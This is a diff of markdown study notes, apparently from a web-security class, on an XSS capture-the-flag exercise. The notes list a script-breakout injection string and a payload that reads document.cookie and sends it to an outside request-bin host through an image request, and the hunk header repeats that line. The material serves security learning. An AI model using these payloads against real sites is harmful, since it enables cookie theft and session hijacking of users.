@@ -51,7 +51,10 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
 1. Review
 2. XSS CTF <br>
 a. CTF XSS 2
-  - Error = Showing the direct sentence on HTML = <script>alert('x에 대한 검색 결과가 존재하지 않습니다.');</script>
+  - Error = Showing the direct sentence on HTML
+```javascript
+<script>alert('x에 대한 검색 결과가 존재하지 않습니다.');</script>
+```
   - Check Attack statement on search bar = xss');alert(1);var i=('
   - Check Attack => xss');var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;var i=('
   - Send to repeater the POST URL to change GET method
